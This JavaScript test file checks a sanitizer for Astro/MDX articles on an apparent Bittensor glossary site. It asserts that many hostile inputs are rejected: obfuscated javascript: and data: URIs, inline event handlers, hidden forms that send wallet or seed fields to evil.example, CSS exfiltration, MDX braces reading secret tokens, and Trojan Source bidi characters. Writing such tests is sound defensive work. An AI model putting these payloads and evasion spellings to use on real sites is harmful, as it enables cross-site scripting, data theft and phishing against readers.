import assert from 'node:assert/strict';
import { validateArticleContent } from './sync-articles.js';

const TAB = String.fromCharCode(0x09);
const ZERO_WIDTH_SPACE = String.fromCharCode(0x200b);
const SOFT_HYPHEN = String.fromCharCode(0x00ad);
const WORD_JOINER = String.fromCharCode(0x2060);
const NEXT_LINE = String.fromCharCode(0x85);
const RLO = String.fromCharCode(0x202e); // right-to-left override (Trojan Source)
const LRI = String.fromCharCode(0x2066); // left-to-right isolate
const PDI = String.fromCharCode(0x2069); // pop directional isolate

function rejects(content, label) {
  assert.throws(() => validateArticleContent('fixture', content), /Unsafe article content/, label);
}

function accepts(content, label) {
  assert.doesNotThrow(() => validateArticleContent('fixture', content), label);
}

// <base> tags are blocked: a single <base> rewrites every relative URL on the page.
rejects('Intro.\n\n<base href="https://evil.example/">', 'plain <base>');
rejects('Intro.\n\n<  base   href="https://evil.example/">', 'spaced <base>');

// define:vars can be entity-encoded to evade the literal pattern scan --
// define&#58;vars decodes to define:vars which Astro evaluates at build time.
rejects('Use define&#58;vars to inject.', 'entity-encoded define:vars');
rejects('Use define:vars to inject.', 'plain define:vars');
rejects('Intro.\n\n<frame src="https://evil.example/frame.html">', 'plain <frame>');
rejects('Intro.\n\n<frameset cols="50%,50%"><frame src="a.html"></frameset>', 'plain <frameset>');

// <form> tags are blocked: a raw form can submit reader data (e.g. wallet
// addresses entered into a hidden input) to an attacker-controlled action URL,
// with no JS and no flagged scheme -- action="https://..." passes every
// scheme/handler check above.
rejects('Intro.\n\n<form action="https://evil.example/collect" method="GET"><input name="wallet"><button>Go</button></form>', 'plain <form>');
rejects('Intro.\n\n<  form   action="https://evil.example/collect">', 'spaced <form>');

// Standalone form controls are blocked too: #184 blocks <form>, but a lone
// <button formaction="https://..."> or <input type="hidden" name="wallet"> still
// renders and can exfiltrate data without a wrapping form or flagged scheme.
rejects('Intro.\n\n<button formaction="https://evil.example/collect">Send</button>', 'plain button formaction');
rejects('Intro.\n\n<  button   formaction="https://evil.example/collect">', 'spaced button');
rejects('Intro.\n\n<input type="hidden" name="wallet" value="5Grw...">', 'plain hidden input');
rejects('Intro.\n\n<  input   type="text" name="seed">', 'spaced input');
rejects('Intro.\n\n<textarea name="note">secret</textarea>', 'plain textarea');
rejects('Intro.\n\n<select name="wallet"><option>5Grw...</option></select>', 'plain select');
rejects('Intro.\n\n<option value="evil">Pick me</option>', 'standalone option');
rejects('Intro.\n\n<fieldset><legend>Seed phrase</legend></fieldset>', 'standalone fieldset');
rejects('Intro.\n\n<datalist id="wallets"><option value="5Grw..."></datalist>', 'standalone datalist');
rejects('Intro.\n\n<output name="result">done</output>', 'standalone output');

// The `ping` attribute on an allowed <a> is a no-JS tracking beacon: a click
// POSTs to the listed URL. It passes every scheme/handler/element check, so it
// is blocked as its own attribute, like slot= and the form controls above.
rejects('Read [docs](https://x.example/) <a href="/wiki/stake/" ping="https://evil.example/track">stake</a>.', 'plain ping attribute');
rejects('Intro.\n\n<  a   href="/wiki/stake/"   ping = "https://evil.example/track">x</a>', 'spaced ping attribute');

// Prose mentioning "ping" without an attribute assignment — including the
// "shipping"/"mapping" substrings — must still pass.
accepts('Network latency such as a 20 ms ping is unrelated to markup.', 'benign ping prose');
accepts('Shipping and mapping are ordinary words and must not be flagged.', 'benign ping substrings');

// contenteditable/tabindex/draggable on allowed elements expose editing, focus-trap,
// and drag surfaces with no script or flagged scheme. Tests use only allowed tags.
rejects('Intro.\n\n<div contenteditable="true">edit me</div>', 'plain contenteditable attribute');
rejects('Intro.\n\n<  p   contenteditable = "plaintext-only">edit</p>', 'spaced contenteditable attribute');
rejects('Intro.\n\n<div tabindex="0">trap</div>', 'plain tabindex attribute');
rejects('Intro.\n\n<  span   tabindex = "-1">trap</span>', 'spaced tabindex attribute');
rejects('Intro.\n\n<span draggable="true">drag</span>', 'plain draggable attribute');
rejects('Intro.\n\n<  a   href="/wiki/foo/"   draggable = "false">link</a>', 'spaced draggable attribute');

// Non-space-delimited spellings must be caught too (same contract as on* handlers).
rejects('<div href="x"contenteditable="true">edit</div>', 'quote-abutted contenteditable attribute');
rejects('<p class=x/tabindex="0">trap</p>', 'slash-delimited tabindex attribute');
rejects('<img src="/wiki/fig.png" draggable="true">', 'quote-abutted draggable attribute');

// Benign URLs inside quoted attribute values must not trip the non-space scan.
accepts('See <a href="/online=1">pricing</a> for details.', 'equals sign inside quoted href');

// Prose that discusses these attributes without an assignment must still pass.
accepts('Rich editors set contenteditable on a container element.', 'benign contenteditable prose');
accepts('Keyboard navigation can reference the tabindex attribute.', 'benign tabindex prose');
accepts('Drag-and-drop UIs mark elements with the draggable attribute.', 'benign draggable prose');

// download= on an allowed <a> is a drive-by file download primitive; popover= on
// allowed elements renders a native overlay with no script or flagged scheme.
rejects('Intro.\n\n<a href="/evil.bin" download="wallet.zip">grab</a>', 'plain download attribute');
rejects('Intro.\n\n<  a   href="/wiki/foo/"   download = "payload.bin">link</a>', 'spaced download attribute');
rejects('Intro.\n\n<div popover="auto">overlay menu</div>', 'plain popover attribute on div');
rejects('Intro.\n\n<  p   popover = "manual">hidden panel</p>', 'spaced popover attribute');

// Non-space-delimited spellings must be caught too (same contract as on* handlers).
rejects('<a href="x"download="evil.zip">grab</a>', 'quote-abutted download attribute');
rejects('<div class=x/popover="auto">overlay</div>', 'slash-delimited popover attribute');

// Prose that discusses these attributes without an assignment must still pass.
accepts('A download manager fetches files unrelated to the download attribute.', 'benign download prose');
accepts('Popover overlays are a native UI primitive described here only as prose.', 'benign popover prose');

// accesskey= binds a keyboard shortcut to an element, so an injected accesskey on
// a hidden link lets a single keypress activate it (focus/navigation hijack) with
// no script or flagged scheme. Blocked like the other interaction attributes.
rejects('Intro.\n\n<a href="/evil/" accesskey="s">go</a>', 'plain accesskey attribute');
rejects('Intro.\n\n<  div   accesskey = "x">hijack</div>', 'spaced accesskey attribute');
rejects('<a href="x"accesskey="s">go</a>', 'quote-abutted accesskey attribute');
rejects('<p class=x/accesskey="z">trap</p>', 'slash-delimited accesskey attribute');
accepts('An accesskey hint can document a keyboard shortcut without setting one.', 'benign accesskey prose');

// <details>/<summary> expose interactive disclosure UI with no script or inline
// style — the same unwanted interactive surface as the already-blocked <dialog>.
rejects('Intro.\n\n<details open><summary>Seed phrase</summary>evil</details>', 'plain <details>');
rejects('Intro.\n\n<  details  ><summary>x</summary></details>', 'spaced <details>');
rejects('Intro.\n\n<summary>Click here</summary>', 'standalone <summary>');

// Prose that merely mentions these words without an opening tag must still pass.
accepts('Details about staking are described here only as prose.', 'benign details prose');
accepts('A summary section is ordinary writing without a summary element tag.', 'benign summary prose');

// <noscript> is parsed under scripting-state-dependent rules — a known mXSS /
// sanitizer-confusion surface — and a glossary never needs script-fallback markup.
rejects('Intro.\n\n<noscript><img src="//evil.example/x"></noscript>', 'plain <noscript>');
rejects('Intro.\n\n<  noscript  >fallback</noscript>', 'spaced <noscript>');
accepts('Progressive enhancement and noscript fallbacks are described here as prose.', 'benign noscript prose');

// <marquee> still renders an animated scrolling banner in current browsers, so an
// injected one is a content-spoofing / phishing surface with no script. Blocked.
rejects('Intro.\n\n<marquee>Your wallet is compromised — visit evil.example</marquee>', 'plain <marquee>');
rejects('Intro.\n\n<  marquee   behavior="alternate">x</marquee>', 'spaced <marquee>');
accepts('Scrolling marquee banners are a legacy UI pattern described here as prose.', 'benign marquee prose');

// referrerpolicy= overrides the site's strict Referrer-Policy header for one
// element — an injected referrerpolicy="unsafe-url" leaks the full referring URL
// to an external destination. Blocked like the other interaction attributes.
rejects('Intro.\n\n<a href="https://evil.example/" referrerpolicy="unsafe-url">go</a>', 'plain referrerpolicy attribute');
rejects('Intro.\n\n<  img   src="/wiki/fig.png"   referrerpolicy = "unsafe-url">', 'spaced referrerpolicy attribute');
rejects('<a href="x"referrerpolicy="unsafe-url">go</a>', 'quote-abutted referrerpolicy attribute');
rejects('<img src="/a.png"/referrerpolicy="unsafe-url">', 'slash-delimited referrerpolicy attribute');
accepts('A site-wide referrer policy is configured in the response headers, described here as prose.', 'benign referrer policy prose');

// Plain dangerous URL schemes remain blocked.
rejects('See [x](javascript:alert(1)).', 'plain javascript:');
rejects('See [x](vbscript:msgbox(1)).', 'plain vbscript:');
rejects('See [x](data:text/html;base64,PHNjcmlwdD4=).', 'plain data:text/html');
rejects('See [x](data:image/svg+xml,<svg></svg>).', 'plain svg data uri');
rejects('See [x](data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+).', 'base64 svg data uri (script hidden in blob)');
rejects('See [x](data:application/xhtml+xml;base64,PHNjcmlwdD4=).', 'base64 xhtml data uri (script hidden in blob)');
rejects('See [x](data:text/javascript,alert(1)).', 'plain data:text/javascript');
rejects('See [x](data:application/ecmascript,alert(1)).', 'plain data:application/ecmascript');
rejects('See [x](&#100;ata:text/javascript,alert(1)).', 'entity data:text/javascript');

// MDX expression braces execute at build time in article bodies. They are only
// allowed when escaped as literal prose or inside Markdown code examples.
rejects('Do not evaluate {process.env.SECRET_TOKEN}.', 'plain MDX expression brace');
rejects('A stray closing brace } is rejected conservatively.', 'stray MDX closing brace');
rejects(String.raw`Even backslashes do not escape \\{process.env.SECRET_TOKEN}.`, 'double-backslash MDX brace evasion');

// MDX disables CommonMark indented code blocks (they collide with JSX
// indentation), so a 4-space / tab indented line is NOT inert code: its braces
// evaluate as a live MDX expression at build time. The scanner must reject
// indented braces, not mistake them for a code block and skip them.
rejects('Intro.\n\n    {process.env.SECRET_TOKEN}\n', 'four-space indented MDX expression');
rejects('Intro.\n\n\t{process.env.SECRET_TOKEN}\n', 'tab-indented MDX expression');
rejects('- item\n\n    {process.env.SECRET_TOKEN}\n', 'list-indented MDX expression');
rejects('> quote\n\n    {process.env.SECRET_TOKEN}\n', 'blockquote-indented MDX expression');

// Obfuscated dangerous schemes are now blocked too.
rejects('See [x](java&amp;#115;cript:alert(1)).', 'double-encoded amp javascript:');
rejects('See [x](java&#115;cript:alert(1)).', 'decimal-entity javascript:');
rejects('See [x](java&#x73;cript:alert(1)).', 'hex-entity javascript:');
rejects('See [x](javascript&colon;alert(1)).', 'named-colon javascript:');
rejects(`See [x](java${TAB}script:alert(1)).`, 'tab-split javascript:');
rejects(`See [x](java${ZERO_WIDTH_SPACE}script:alert(1)).`, 'zero-width javascript:');
rejects(`See [x](java${SOFT_HYPHEN}script:alert(1)).`, 'soft-hyphen javascript:');
rejects(`See [x](java${WORD_JOINER}script:alert(1)).`, 'word-joiner javascript:');
rejects(`See [x](java${NEXT_LINE}script:alert(1)).`, 'C1-control javascript:');
rejects('See [x](&#100;ata:text/html,evil).', 'entity data:text/html');
rejects('See [x](vb&#115;cript:msgbox(1)).', 'decimal-entity vbscript:');
rejects('See [x](&#100;ata:image/svg+xml;base64,PHN2Zz4=).', 'entity-obfuscated svg data uri');
rejects('See [x](&#100;ata:application/xhtml+xml;base64,PHNjcmlwdD4=).', 'entity-obfuscated xhtml data uri');
rejects('See [x](data:image/svg&plus;xml;base64,PHN2Zz4=).', 'named-plus-entity svg data uri');
rejects('See [x](data:application/xhtml&plus;xml;base64,PHNjcmlwdD4=).', 'named-plus-entity xhtml data uri');

// Bidirectional control characters (Trojan Source, CVE-2021-42574) reorder how
// text renders without changing its bytes, so a link can display as a trusted
// host while resolving elsewhere, or prose can be scrambled past a reviewer.
// They are invisible in most editors, so they must be rejected outright.
rejects(`A link [docs](https://docs.bittensor.com${RLO}/evil/) here.`, 'right-to-left override in URL');
rejects(`Intro.\n\nReorder ${LRI}some text${PDI} here.`, 'directional isolate controls');

// Plain prose with no bidi controls must still pass.
accepts('Staking and unstaking are described here in ordinary left-to-right prose.', 'benign prose without bidi controls');

// Inline event handlers are blocked regardless of the attribute delimiter — a
// slash, or a quote abutting the handler — not just a leading space.
rejects('<img src=x onerror=alert(1)>', 'space-delimited handler');
rejects('<img src=x/onerror=alert(1)>', 'slash-delimited handler');
rejects('<a href="x"onclick=alert(1)>c</a>', 'quote-abutted handler');
rejects("<p title='a'onmouseover=alert(1)>h</p>", 'single-quote-abutted handler');

// Legitimate content passes — guard against false positives.
accepts(
  '# Staking\n\nStaking locks TAO. Source: [docs](https://docs.bittensor.com/).',
  'normal article'
);
accepts(
  'The word JavaScript appears here, and a base value of 10, without any scheme.',
  'benign keywords (no scheme)'
);
accepts(
  'VBScript is a legacy Microsoft scripting language, mentioned here only as prose.',
  'benign vbscript keyword (no scheme)'
);
accepts(
  'A raster data URI such as data:image/png;base64,iVBORw0KGgo= is harmless and allowed.',
  'benign raster data URI (only script-capable data URLs are blocked)'
);
accepts(
  'Encode an ampersand as &amp; or a snowman as &#9731; without tripping the scanner.',
  'benign entities'
);
accepts(
  'Prose may use the plus entity: C&plus;&plus; and the sum 2 &plus; 2 = 4 are fine.',
  'benign named-plus entity (no scheme)'
);
accepts(
  String.raw`Literal braces can be escaped as \{alpha\} in prose.`,
  'escaped literal MDX braces'
);
accepts(
  '---\ntitle: "Alpha {TAO}"\n---\n\nFrontmatter braces are metadata, not article-body MDX.',
  'frontmatter braces'
);
accepts(
  '```jsx\n{process.env.SECRET_TOKEN}\n```\n',
  'fenced code block with braces'
);
accepts(
  '~~~js\n{process.env.SECRET_TOKEN}\n~~~\n',
  'tilde fenced code block with braces'
);
accepts(
  'Use `{process.env.SECRET_TOKEN}` as an inline code example.',
  'inline code span with braces'
);
accepts(
  'Emoji before code stays aligned 🧠 `{process.env.SECRET_TOKEN}`.',
  'inline code span after astral Unicode'
);
accepts(
  'A query like [docs](https://example.com/online=1) is fine — a URL path segment is not a handler.',
  'url segment resembling a handler (not inside a tag)'
);
// Handler-like text inside a quoted attribute value is NOT an inline handler:
// the slash lives in a URL/path, not at an attribute boundary.
accepts('<a href="/online=1">link</a>', 'handler-like path in a quoted href value');
accepts('<img src="/onboarding=1.png" alt="x">', 'handler-like path in a quoted src value');
accepts('<code data-example="/onerror=not-handler">snippet</code>', 'handler-like text in a quoted data- value');

rejects('Hydrate with client:load here.', 'client directive token in article body');
rejects('Render via server:defer here.', 'server directive token in article body');
rejects('Animate with transition:animate here.', 'transition directive token in article body');
rejects('Render with is:raw here.', 'is directive token in article body');
rejects('Render with class:list here.', 'class:list directive token in article body');
rejects('Render with set:text here.', 'set:text directive token in article body');
rejects('Pass secrets with define:vars={{ token }}.', 'define:vars directive token in article body');
rejects('Use define:style={{ color: "red" }}.', 'define:style directive token in article body');
rejects('Use define:env to inject.', 'unlisted define directive token in article body');
rejects('Render with class&#58;list here.', 'entity-encoded class:list directive');
rejects('Render with set&#58;text here.', 'entity-encoded set:text directive');
rejects('Use define&#58;style to inject.', 'entity-encoded define:style');
rejects('Use define&#58;env to inject.', 'entity-encoded unlisted define directive');

// Every template directive — not just define:vars/style — must also be caught
// after entity/zero-width deobfuscation, so an obfuscated spelling cannot slip
// the literal scan the way `set&colon;html` once did.
rejects('Inject set&#58;html here.', 'entity-encoded set:html');
rejects('Inject set&colon;html here.', 'named-colon set:html');
rejects(`Inject set:ht${SOFT_HYPHEN}ml here.`, 'soft-hyphen set:html');
rejects(`Inject set:te${SOFT_HYPHEN}xt here.`, 'soft-hyphen set:text');
rejects(`Render with class:li${SOFT_HYPHEN}st here.`, 'soft-hyphen class:list');
rejects('Hydrate with client&#58;load here.', 'entity-encoded client: directive');
rejects('Render via server&colon;defer here.', 'named-colon server: directive');
rejects('Animate with transition&#58;animate here.', 'entity-encoded transition: directive');
rejects('Render with is&colon;raw here.', 'named-colon is: directive');
rejects(`Use define:pr${SOFT_HYPHEN}ops here.`, 'soft-hyphen unlisted define directive');

// Astro slot attributes on raw HTML must not appear in article bodies.
rejects('Intro.\n\n<div slot="sidebar">evil</div>', 'plain slot attribute');
rejects('Intro.\n\n<  div   slot="sidebar">', 'spaced slot attribute');

// Inline style attributes are blocked: the <style> element is already blocked,
// but a style="" attribute on an allowed element still lets injected CSS
// exfiltrate data, overlay the page, or spoof content with no script or scheme.
rejects('Intro.\n\n<div style="background:url(//evil.example/?leak)">x</div>', 'plain style attribute');
rejects('Intro.\n\n<  p   style = "position:fixed">x</p>', 'spaced style attribute');
rejects('A link <a href="/wiki/stake/" style="color:red">stake</a> here.', 'style attribute on anchor');

// Prose that merely mentions the word "style" without an attribute assignment
// (including the "lifestyle" substring) must still pass.
accepts('The visual style of the site is defined in a separate stylesheet.', 'benign style prose');
accepts('A lifestyle choice is unrelated to CSS and must not be flagged.', 'benign lifestyle substring');

// xmlns namespace attribute assignments must not appear in article bodies.
rejects('Intro.\n\n<svg xmlns="http://www.w3.org/2000/svg"></svg>', 'plain xmlns attribute');
rejects('Intro.\n\n<svg xmlns = "http://www.w3.org/2000/svg"></svg>', 'spaced equals xmlns attribute');
rejects('Intro.\n\n<svg xmlns:xlink="http://www.w3.org/1999/xlink"></svg>', 'plain xmlns:prefix attribute');
rejects('Intro.\n\n<  svg   xmlns : xlink = "http://www.w3.org/1999/xlink">', 'spaced xmlns:prefix attribute');

// Prose that merely mentions xmlns without an attribute assignment must still pass.
accepts('The xmlns attribute declares an XML namespace in markup.', 'benign xmlns prose');
accepts('The xmlns:xlink attribute is used in SVG documents.', 'benign xmlns:prefix prose');

// <svg> and <math> are foreign-content roots and a classic mXSS vector. They are
// blocked as elements outright -- even without an xmlns attribute, an event
// handler, or a flagged scheme, which the cases below deliberately omit so they
// only pass once the element block itself is present.
rejects('Intro.\n\n<svg viewBox="0 0 1 1"><circle r="1" /></svg>', 'plain <svg> element');
rejects('Intro.\n\n<  svg  ><circle r="1" /></svg>', 'spaced <svg> element');
rejects('Intro.\n\n<math><mi>x</mi></math>', 'plain <math> element');
rejects('Intro.\n\n<  math  ><mi>x</mi></math>', 'spaced <math> element');

// Prose that merely names these formats without an opening tag must still pass.
accepts('SVG and MathML are XML-based formats, described here only as prose.', 'benign svg/math prose');

// <dialog open> renders a top-layer overlay (with backdrop) and no script or
// inline style, so a raw <dialog> is a clickjacking/phishing primitive. Blocked.
rejects('Intro.\n\n<dialog open>Your wallet is compromised. Visit evil.example.</dialog>', 'plain <dialog open>');
rejects('Intro.\n\n<  dialog  >hidden modal</dialog>', 'spaced <dialog>');

// Prose that merely mentions the word "dialog" without an opening tag must pass.
accepts('A dialog box is a UI concept mentioned here only as prose.', 'benign dialog prose');

// <template> parses its contents into an inert fragment (DOM-clobbering /
// mutation-XSS / sanitizer-evasion surface) and renders nothing, so block it.
rejects('Intro.\n\n<template id="config"><a id="evil"></a></template>', 'plain <template>');
rejects('Intro.\n\n<  template  >hidden</template>', 'spaced <template>');

// Prose that merely mentions the word "template" without an opening tag must pass.
accepts('An article template is a writing convention mentioned here only as prose.', 'benign template prose');

// <fencedframe> embeds cross-origin content like <iframe> (its Privacy Sandbox
// successor), so it is the same embedding/clickjacking surface. Blocked.
rejects('Intro.\n\n<fencedframe src="https://evil.example/"></fencedframe>', 'plain <fencedframe>');
rejects('Intro.\n\n<  fencedframe  >x</fencedframe>', 'spaced <fencedframe>');

// Prose that merely mentions the word "fencedframe" without a tag must pass.
accepts('A fencedframe is an embedding primitive described here only as prose.', 'benign fencedframe prose');

// <video>/<audio> render native media UI with no script; CSP media-src 'none' does not
// stop the elements from appearing. Block them like dialog and fencedframe.
rejects('Intro.\n\n<video src="/evil.mp4" controls></video>', 'plain <video>');
rejects('Intro.\n\n<  audio  src="/evil.mp3"></audio>', 'spaced <audio>');
rejects('Intro.\n\n<picture><source srcset="https://evil.example/x.webp" type="image/webp"><img src="/wiki/fig.png" alt="x"></picture>', 'plain <picture>');
rejects('Intro.\n\n<  source  srcset="https://evil.example/x.webp">', 'spaced <source>');

// Prose that merely names these formats without an opening tag must still pass.
accepts('Video and audio codecs are discussed here only as prose.', 'benign video/audio prose');
accepts('A picture element is an HTML concept mentioned here without a tag.', 'benign picture prose');
accepts('The source of truth for this term is documented in prose only.', 'benign source prose');

// <map>/<area> plus usemap= on <img> are client-side image-map clickjacking primitives.
rejects('Intro.\n\n<map name="evil"><area shape="rect" coords="0,0,999,999" href="https://evil.example/"></map>', 'plain <map>');
rejects('Intro.\n\n<  area  shape="rect" coords="0,0,1,1" href="https://evil.example/">', 'spaced <area>');
rejects('Intro.\n\n<img src="/wiki/fig.png" usemap="#evil" alt="diagram">', 'plain usemap attribute');
rejects('Intro.\n\n<  img   src="/wiki/fig.png"   usemap = "#evil">', 'spaced usemap attribute');
rejects('<img src="/wiki/fig.png"usemap="#evil">', 'quote-abutted usemap attribute');
rejects('<img src=x/usemap="#evil">', 'slash-delimited usemap attribute');

// Prose mentioning image maps without tags or assignments must still pass.
accepts('An image map is a UI concept described here only as prose.', 'benign map prose');
accepts('The usemap attribute pairs an image with a map element.', 'benign usemap prose');

// Prose that merely mentions these English words without the directive colon
// must still pass — guard the new patterns against false positives.
accepts('This client is set to define the class list style, and the server is fast.', 'benign client/server/set/class/define prose');

console.log('Content sanitizer check passed');
